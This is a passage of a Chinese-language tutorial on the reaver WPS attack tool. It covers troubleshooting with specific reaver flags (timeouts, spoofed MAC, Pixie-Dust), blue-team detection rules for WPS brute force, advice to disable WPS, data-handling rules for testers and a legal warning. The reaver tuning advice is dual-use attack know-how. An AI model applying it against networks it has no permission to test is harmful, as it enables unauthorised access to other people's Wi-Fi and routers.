| **reaver → [hashcat](../04-口令攻击/hashcat.md)** | WPS 走不通时的替代路径：抓握手 → 字典破解 |
| **[bettercap](bettercap.md)** | 也有 WPS 相关模块 |
| **[kismet](kismet.md)** | 蓝队：检测 WPS 暴力行为 |

**两条路径的对比**：

| | WPS 路径（reaver） | PSK 路径（aircrack-ng） |
| --- | --- | --- |
| 前提 | AP 开启 WPS | 抓到握手（需客户端） |
| 依赖字典 | ❌ | ✅（完全依赖） |
| 耗时 | Pixie-Dust: 秒级；PIN: 数小时 | 取决于字典与算力 |
| 对网络的影响 | PIN 暴力有大量请求 | deauth 会中断客户端 |
| 现代可行性 | **低**（多数已修复/关闭） | 中（取决于口令强度） |

**实战建议**：**两条路都试一遍**。`wash` 先看 WPS 是否可打；同时用 [airodump-ng](airodump-ng.md) 抓握手做 Plan B。

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `wash` 输出里**没有目标 AP** | AP 没开 WPS | **reaver 无从下手**。改用 [hashcat](../04-口令攻击/hashcat.md) 路径 |
| `wash` 里 `Lck` 是 `Yes` | AP 被锁定（可能你之前试过） | **停止攻击，等锁定期结束**（几分钟到数小时） |
| `Failed to associate` | 信号差 / MAC 过滤 / 信道问题 | 靠近 AP；`-m <伪造MAC>`；确认 `-c` 信道正确 |
| `Waiting for beacon` 一直卡住 | 信道不匹配 | 用 `wash -c <信道>` 或 [airodump-ng](airodump-ng.md) 确认 |
| `Detected AP rate limiting` | ⭐ **AP 有锁定机制** | **这是正常的**。PIN 暴力在现代 AP 上不现实。**接受这个结论** |
| `WPS transaction failed` 反复出现 | M5/M7 超时太短（默认 0.40 秒） | ⭐ **调大 `-T`**：`-T 2.0`；同时调大 `-t 15` |
| 每次都在同一个 PIN 上循环 | 交互不稳定，reaver 在重试 | 调大 `-T`；加 `-F`（忽略 FCS 错误）；靠近 AP |
| 试了 1000 次还在试前 4 位 | 正常——前 4 位有 10000 种可能 | 有耐心，或被锁定就放弃 |
| `Pixie-Dust failed` | 芯片已修复随机数缺陷 | 换 `--bully`（通过 wifite）；或接受结论 |
| `-d 0` 报错 | WPS 规范要求尝试间隔 ≥ 1 秒 | **必须 `-d 1` 或更大** |
| 攻击后自己断网了 | 你在攻击自己的网络，且刷新了 AP 状态 | 正常；用另一台设备或网线做管理 |
| 拿到了 PSK 但连不上 | 口令有特殊字符，或 AP 还有其他要求 | 注意引号转义；检查 AP 是否有 MAC 白名单 |
| 退出后上不了网 | 监听模式未恢复 | `sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager` |
| 虚拟机里不工作 | USB 直通 | 用物理机 + USB 网卡 |
| `.wpc` 文件里有明文口令被不小心提交到 git | ⚠️ **数据泄露** | 加到 `.gitignore`；按 ROE 要求处理 |

### 排错决策图

```text
reaver 不成功
│
├─ wash 里看不到目标 AP？
│     → AP 没开 WPS → 改用 hashcat 路径抓握手破解
│
├─ wash 里 Lck = Yes？
│     → 停止。等锁定期。不要用 -L 硬刚
│
├─ Failed to associate？
│     → 信道 / 信号 / MAC 过滤 → -c + 靠近 + -m
│
├─ 频繁 WPS transaction failed？
│     → 调大 -T 2.0 -t 15，加 -F，靠近 AP
│
├─ Detected AP rate limiting？
│     → 正常。PIN 暴力不现实。
│       → 试 Pixie-Dust -K
│       → 或接受结论并汇报
│
├─ Pixie-Dust failed？
│     → 芯片已修复
│       → 可试 --bully（wifite --bully）
│       → 或接受结论
│
└─ 成功但 PSK 连不上？
      → 检查引号转义 / MAC 白名单
```

## 9. 防御视角（蓝队）

WPS 的防御**极其简单**：**关闭它**。

### 9.1 核心措施

| 措施 | 效果 | 操作 |
| --- | --- | --- |
| **关闭 WPS** | ✅ **彻底消除 reaver 的攻击面** | 路由器管理界面 → 无线设置 → WPS/Wi-Fi Protected Setup → **设为 Disabled** |
| 若必须用 WPS，只用 PBC（按钮） | 需要物理接触（**且要确认真的需要**） | 有些路由器的 PBC 是「任意设备 2 分钟内可加入」——**这也有风险** |
| 升级固件 | 修复 Pixie-Dust 的随机数缺陷 | 定期检查厂商固件更新 |
| 启用 WPS 锁定（如果必须开着） | 让 PIN 暴力不现实 | 多数现代路由器默认已启用 |
| 换支持 WPA3 的路由器 | 消除多种攻击面 | — |

**为什么「关闭 WPS」是路由器加固的第一条**：

```
开启 WPS 的效果：
  10^8 种 PIN  →  实际只有 11000 次尝试（协议缺陷）
  11000 次尝试 × 1 秒  ≈  3 小时（如果没有锁定机制）

  而 WPA2 的 PSK：
  任意长度的口令，8 位随机大小写数字 ≈ 10^14 种组合
  → 即使有 GPU 也几乎不可能穷尽
```

**WPS 把「几乎不可能」变成了「几小时」。** 这就是为什么它是第一个该关的功能。

### 9.2 怎么检查自己的路由器

**用官方工具确认 WPS 状态**：

```bash
# 方法 1：从 AP 的管理界面（最可靠）
# 通常在「无线设置」「Wi-Fi」「高级无线」里

# 方法 2：用 wash 从外部扫描（你自己拥有的网络）
sudo airmon-ng start wlan0
sudo wash -i wlan0mon -a        # -a 显示所有 AP，对比哪些开了 WPS
```

**如果想看 WPS 的详细信息**：

```bash
sudo wash -i wlan0mon -j | python3 -m json.tool
```

**也可以用 `wpspin` / 路由器管理 API**，但最可靠的还是**登录路由器后台看设置**。

### 9.3 检测 WPS 攻击

| 攻击行为 | 检测信号 |
| --- | --- |
| **PIN 暴力** | AP 的 WPS 状态机异常：大量 M4 消息（含错误 PIN）、大量 NACK；锁定事件被触发 |
| **Pixie-Dust** | ⚠️ **几乎没有痕迹**（只有一次正常的 M1~M8 交换） |
| **Pixie-Dust 重试** | 多次异常的「单次完整交互」——如果攻击者反复试，会看到重复的 M1~M8 会话 |
| 异常客户端 | 源 MAC 是伪造的（厂商 OUI 不匹配路由器所在环境） |

**检测规则思路**（基于 AP 侧日志）：

```text
# 规则 1：WPS PIN 暴力
if count(wps_m4_messages, 5m) > 20
   or count(wps_nack_messages, 5m) > 20
then alert "possible WPS PIN brute-force"

# 规则 2：WPS 锁定事件
if wps_locked_event
then alert "WPS lock triggered - possible brute-force in progress"

# 规则 3：重复的 WPS 会话（Pixie-Dust 重试）
if count(wps_sessions, 1h) > 5 and all_sessions_short
then alert "possible Pixie-Dust retry attempt"
```

**推荐工具**：

- 路由器自身日志（部分型号会记录 WPS 失败）；
- [kismet](kismet.md) 的 WIDS 功能；
- 企业 AP 控制器的集中日志与告警。

**⚠️ 一个重要现实**：

> **多数家用路由器完全不记录 WPS 攻击**。所以对于家用场景，**「检测」基本不存在**——唯一的有效防护就是**关闭 WPS**。

### 9.4 数据处理的合规要求（针对授权测试人员）

reaver 会写 `.wpc` 文件，其中**包含明文 PIN 与 PSK**。在授权的渗透测试中：

| 事项 | 要求 |
| --- | --- |
| 数据分类 | 无线凭据属于**客户的敏感数据** |
| 存储 | 加密存储；**不放在个人设备上**；不提交到代码仓库 |
| `.gitignore` | 至少确保 `*.wpc`、`cracked.json` 不被误提交 |
| 传输 | 不通过未加密渠道发送 |
| 删除 | 项目结束后按 ROE 规定的期限**彻底删除** |
| 报告 | 报告中**不应包含完整口令**（除非 ROE 明确要求），用占位符替代 |
| 记录 | 保留操作日志以备审计 |

```bash
# .gitignore 建议包含
cat >> .gitignore <<'EOF'
*.wpc
*.cap
*.pmkid
*.22000
cracked.json
hs/
wps/
EOF
```

**这是红队/合规视角必须知道的事**：即使攻击是授权的，**数据处理不当仍然违规**。

### 9.5 一个容易被忽略的点：PIN 泄密的连锁影响

WPS PIN 泄露的影响**不止于 Wi-Fi 口令**：

| 影响 | 说明 |
| --- | --- |
| Wi-Fi 口令泄露 | 拿到 PIN 后 AP 直接返回 PSK |
| **AP 配置可被修改** | WPS 协议允许通过 PIN 修改 AP 的 SSID、PSK 等设置 → **攻击者可以改掉你的 Wi-Fi 密码** |
| 长期后门 | 如果 PIN 不变（出厂固定），**攻击者随时可以重新取回凭据**（即使你改了 PSK） |

**最后一条最重要**：

> **如果你的路由器 WPS PIN 是出厂固定的（印在背面），那么只要你改了 PSK，攻击者可以用同一个 PIN 再取一次新的 PSK。**
>
> 这是**持久性后门**性质的问题。**唯一彻底的解法是关闭 WPS**（或换设备时确认 PIN 会重新生成）。

## 10. 参考

- 官方仓库（t6x 维护的 fork）：<https://github.com/t6x/reaver-wps-fork-t6x>
- 原版项目（Tactical Network Solutions）：<https://github.com/tacnetsol/reaver>
- Kali 工具页：<https://www.kali.org/tools/reaver/>
- 本机手册：`man reaver`、`man wash`
- 本机帮助：`reaver -h`、`wash -h`
- 本机文档目录：`/usr/share/doc/reaver/`（含 `README.WASH`）
- Pixie-Dust 原始论文：Dominique Bongard，「Pixie Dust: The Good and The Bad」
- 相关本目录：[aircrack-ng](aircrack-ng.md)（套件总览）、[airmon-ng](airmon-ng.md)、[airodump-ng](airodump-ng.md)、[aireplay-ng](aireplay-ng.md)、[wifite](wifite.md)、[kismet](kismet.md)、[bettercap](bettercap.md)
- 相关其他目录：[hashcat](../04-口令攻击/hashcat.md)、[wordlists](../04-口令攻击/wordlists.md)

## ⚠️ 法律与伦理

**WPS 攻击的性质比「破解 Wi-Fi 密码」更严重**，原因有二：

1. **PIN 暴力会向 AP 发送上万次请求**——这是**明显的未授权访问尝试**，且在 AP 日志中留下大量痕迹。攻击者无法主张「我只是偶然连上」；
2. **PIN 泄露意味着 AP 的管理权限部分泄露**——不只是「连上网络」，而是可能**修改路由器配置**。性质从「未授权接入」升级到「未授权控制系统」。

**相关法律责任**（中国大陆）：

| 法律 | 条款 | 行为 |
| --- | --- | --- |
| 《刑法》 | 第二百八十五条 | **非法侵入计算机信息系统罪** / 非法获取计算机信息系统数据罪 |
| 《刑法》 | 第二百八十六条 | 破坏计算机信息系统罪（若利用 PIN 修改了目标 AP 配置） |
| 《无线电管理条例》 | 相关条款 | 擅自使用无线电频率、干扰合法无线电业务 |
| 《网络安全法》 | 第二十七条 | 禁止任何危害网络安全的活动 |
| 《治安管理处罚法》 | 相关条款 | 干扰他人正常通信 |

**本教程仅适用于**：

- ✅ **你自己拥有的 Wi-Fi 网络与你自己的路由器**（包括「忘了 PSK，用背面 PIN 取回」这种完全合法的用法）
- ✅ 有**书面授权**、明确列出授权 SSID 与时间窗的无线渗透测试
- ✅ 你自己搭建的隔离无线实验室
- ✅ 授权的 CTF 靶场

**严禁**：

- ❌ 对邻居、公司、公共场所的任何 Wi-Fi 执行 reaver
- ❌ 使用 `-L`（忽略锁定）对非自有 AP 长时间暴力——这既是技术上的无效做法，也是明显的恶意行为
- ❌ 保留他人的 `.wpc` 文件（包含明文 PIN 与 PSK）
- ❌ 用 PIN 修改任何非自有路由器的配置

**推荐的学习与实用路径**：

```text
✅ 场景 1：用自己的 PIN 取回自己的 PSK（完全合法，涵盖全部协议交互，无暴力）
✅ 场景 4：抓一次 WPS 交换，用 Wireshark 分析 M1~M8（完全合法，学习价值最高）
✅ 用 wash -a 检查自己路由器的 WPS 状态（合法，且有实际安全价值）
✅ 关闭自己路由器的 WPS（这是本文最有价值的行动）
```

**如果你的目的是学习 WPS 攻击原理**：请用上述方式。它们覆盖了 100% 的知识点（协议结构、PIN 缺陷、分两步验证、Pixie-Dust 原理），**且完全不需要对他人发送任何请求**。

**最后一句**：**检查并关闭你路由器的 WPS——这是本文最该带走的行动项。**
